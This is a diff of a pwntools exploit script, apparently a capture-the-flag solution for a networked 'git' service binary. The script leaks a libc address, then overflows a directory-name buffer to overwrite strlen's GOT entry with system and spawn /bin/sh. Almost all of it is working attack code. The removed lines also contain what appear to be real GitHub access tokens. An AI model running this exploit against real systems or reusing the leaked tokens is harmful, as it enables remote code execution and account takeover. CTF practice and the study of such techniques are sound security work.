@@ -1,73 +1,90 @@
-#!/usr/bin/env python3
+#!/usr/bin/python3
+
 from pwn import *
-import warnings
-warnings.filterwarnings("ignore")
-import signal
-def handler(signum, frame):
-    print(signum)
-    exit()
-signal.signal(signal.SIGINT, handler)
 
-exe = ELF("./git")
-# context.log_level='debug'
-context.terminal = ["foot","tmux","new-session"]
-# p = remote("0",9001)
-p = process([exe.path])
-def gdbs():
-    gdb.attach(p, gdbscript="""
-    # brva 0x000000000000251B
-    # b*0x55555555652e
-    # brva 0x00000000000021D6
-    # brva 0x00000000000021AD
-    # bb 000000000000252E
-    bb 00000000000016F0
-    bb 0000000000001733
+exe = ELF('git', checksec=False)
+libc = ELF('libc.so.6', checksec=False)
 
-               """)
-    # p = gdb.debug([exe.path],"""
-    #
-    #                 """)
+context.binary = exe
 
+info = lambda msg: log.info(msg)
 sla = lambda msg, data: p.sendlineafter(msg, data)
 sa = lambda msg, data: p.sendafter(msg, data)
 sl = lambda data: p.sendline(data)
 s = lambda data: p.send(data)
-# while True:
-#     p = remote("157.15.86.73",9001)
-# gdbs()
-# input()
-sla(">","token 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")
-sla(">","repo antkss/lmao")
-gdbs()
-# for i in range(5):
-#     sla(">",f"cat {hex(0x558+i*0x10)}")
-# p.recvuntil(b"a"*1400)
-# leak = u64(p.recv(6).ljust(8,b"\x00"))
-# log.info(f"leak: {hex(leak)}")
-# if b"0x7f" in hex(leak).encode():
-#     log.info(f"leak: {hex(leak)}")
-#     break
+sln = lambda msg, num: sla(msg, str(num).encode())
+sn = lambda msg, num: sa(msg, str(num).encode())
 
-# sla(">","token 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")
-# sla(">","repo antkss/lmao")
-# sla(">","cd aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
-# input()
-# sla(">",f"cd {b"a"*(104+152)}")
-# for i in range(300):
-#     sla(">","cd cac")
+def GDB():
+    if not args.REMOTE:
+        gdb.attach(p, gdbscript='''
+        set follow-fork-mode parent
+        set solib-search-path /home/as/kcsc/gittools/share/solves/git/solution
+        b*changedir+435
+        c
+        ''')
+        input()
 
-    # libc.address = leak - 0x1e7f0a
-    # log.info(f"leak: {hex(leak)}")
-    # p.recvuntil(b"a"*84).ljust(8,b"\x00")
-    # leak_heap = u64(p.recv(6).ljust(8,b"\x00"))
-    # log.info(f"heap: {hex(leak_heap)}")
+def exploit(filename):
+    global p
+    i = 0
+    while True:
+        # if args.REMOTE:
+        p = remote('0', 9001)
+        # else:
+        # p = remote("157.15.86.73",  29085)
+        # p = process(exe.path)
 
+        sla(b'> ', b'token TOKEN')
+        sla(b'> ', b'repo antkss/lmao')
+        res = p.recvline(timeout=5)
+        if b'Request timeout' in res:
+            p.close()
+            continue
 
+        sla(b'> ', f'cat {filename}'.encode())
+        res = p.recvuntil(b'C'*8, timeout=5)                               # my files has 8 bytes "C" at the end so it's easier to check
+        if not res:
+            p.close()
+            continue
+        try:
+            libc_leak = u64(p.recv(6) + b'\0\0')
+            libc.address = (libc_leak & 0xfffffffffffff000) - 0x1ec000          # leaked addresses are from main arena so the difference is just offset
+            log.info(f"debug: {hex(libc_leak)}")
+        except:
+            p.close()
+            continue
 
+        info("Libc leak: " + hex(libc_leak))
+        info("Libc base: " + hex(libc.address))
 
+        if (libc.address & 0xfff or libc.address >> 40 != 0x7f):
+            log.critical("Invalid libc base!")
+            p.close()
+            if i==5:
+                return
+            i+=1
+            continue
+        break
 
+    info("System: " + hex(libc.sym.system))
+    info("Libc GOT: " + hex(libc.address + 0x1ec0a8 + 0x100))
+    # GDB()
+    sla(b'> ', b'cd 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000')
+    payload = flat(
+        {
+            150: b';/bin/sh;',                                                      # Prepare /bin/sh string for snprintf of readfile
+            163: libc.address + 0x1ec0a8 + 0x100,
+        },
+        )
+    sla(b'> ', b'cd ' + payload)
+    sla(b'> ', b'cat deadbeef'.ljust(0x20, b'\0') + p64(libc.sym.system))           # Overwrite __strlen_avx2@got into system
 
+    p.interactive()
 
-p.interactive()
-# good luck pwning :)
+p = None
+if __name__=='__main__':
+    exploit(hex(0x618))               # This offset is correct
+    # for i in range(100):
+    #     exploit(hex(0x558 + i*0x10))
 
